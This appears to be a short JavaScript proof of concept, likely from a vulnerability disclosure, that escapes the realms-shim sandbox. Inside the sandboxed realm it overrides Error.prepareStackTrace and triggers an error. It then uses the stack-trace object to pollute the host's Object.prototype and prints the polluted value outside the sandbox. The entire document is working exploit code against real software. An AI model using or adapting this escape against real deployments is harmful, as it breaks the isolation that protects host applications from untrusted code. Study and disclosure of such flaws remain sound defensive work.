rs = require("realms-shim")
let realm = rs.makeRootRealm();
try {
    realm.evaluate(`
        Error.prepareStackTrace = function (error, stackTrace) {        
            stackTrace.__proto__.__proto__.polluted = 'success'            
        };
        x;
    `);
} catch(e) {
    // we do not even need to print e
}
console.log(polluted);
